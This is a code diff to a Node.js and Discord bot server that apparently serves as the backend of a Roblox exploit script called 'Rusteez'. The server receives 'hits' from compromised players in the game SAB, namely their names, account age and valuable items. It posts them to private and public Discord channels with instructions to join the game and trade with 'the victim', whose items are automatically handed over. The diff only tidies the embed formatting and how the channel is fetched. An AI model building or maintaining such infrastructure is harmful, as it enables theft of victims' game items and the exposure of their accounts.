@@ -6,7 +6,7 @@ const url = require('url');
 const luamin = require('luamin');
 const { randomBytes } = require('node:crypto'); // Utilise le préfixe node: pour être sûr
 const { v4: uuidv4 } = require('uuid');
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags } = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, Events, MessageFlags, WebhookClient } = require('discord.js');
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -468,30 +468,21 @@ wss.on('connection', (ws, req) => {
                     // 3. Préparer l'Embed pour Discord
                     const hitEmbed = new EmbedBuilder()
                     .setTitle("Rusteez • SAB Hit")
-                    .setColor(0x2b2d31) // Couleur sombre Discord pour un look pro
+                    .setColor(0x2b2d31)
                     .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
                     .addFields(
                         { 
                             name: "📄 Player Information", 
-                            value: `\`\`\`properties
-                👤 Display Name : ${hitInfo.DisplayName}
-                🆔 Username     : ${hitInfo.Name}
-                🗓️ Account Age  : ${hitInfo.AccountAge} days
-                📱 Executor     : Delta
-                👥 Players      : ${hitInfo.Players}/8
-                👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}
-                \`\`\`` 
+                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n📱 Executor     : Delta\n👥 Players      : ${hitInfo.Players}/8\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                         },
                         {
                             name: "👑 Valuable Brainrots",
-                            value: `\`\`\`properties
-                ${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
-                    ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
-                    : "None"}
-                \`\`\``
+                            value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
+                                ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
+                                : "None"}\n\`\`\``
                         }
                     )
-                    .setFooter({ text: `Rusteez Script ` });
+                    .setFooter({ text: `Rusteez Script` });
                         
                     // 4. Envoi sur le Webhook PRIVÉ de l'utilisateur
                     try {
@@ -503,33 +494,27 @@ wss.on('connection', (ws, req) => {
                     } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
         
                     // 5. Envoi sur le Channel PUBLIC (public-hits)
-                    const publicChannel = clientDiscord.channels.cache.get('1487370329776193677');
+                    const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
                     if (publicChannel) {
                         // On crée une version un peu plus "anonyme" ou stylée pour le public
-                        const publicEmbed  = new EmbedBuilder()
-                    .setTitle("Rusteez • SAB Hit")
-                    .setColor(0x2b2d31) // Couleur sombre Discord pour un look pro
-                    .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
-                    .addFields(
-                        { 
-                            name: "📄 Player Information", 
-                            value: `\`\`\`properties
-                👤 Display Name : ${hitInfo.DisplayName}
-                🆔 Username     : ${hitInfo.Name}
-                🗓️ Account Age  : ${hitInfo.AccountAge} days
-                👥 Players      : ${hitInfo.Players}/8
-                \`\`\`` 
-                        },
-                        {
-                            name: "👑 Valuable Brainrots",
-                            value: `\`\`\`properties
-                ${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
-                    ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
-                    : "None"}
-                \`\`\``
-                        }
-                    )
-                    .setFooter({ text: `Rusteez Script ` });
+                        const publicEmbed = new EmbedBuilder()
+                            .setTitle("Rusteez • SAB Hit")
+                            .setColor(0x2b2d31)
+                            .setDescription("🛠️ **How to Use?**\nJoin SAB and send a trade request to the victim. They will automatically add all their items to the trade.")
+                            .addFields(
+                                { 
+                                    name: "📄 Player Information", 
+                                    // Note : Pas d'espaces au début des lignes ici
+                                    value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n\`\`\`` 
+                                },
+                                {
+                                    name: "👑 Valuable Brainrots",
+                                    value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
+                                        ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
+                                        : "None"}\n\`\`\``
+                                }
+                            )
+                            .setFooter({ text: `Rusteez Script` });
                         
                         publicChannel.send({ embeds: [publicEmbed] });
                     }
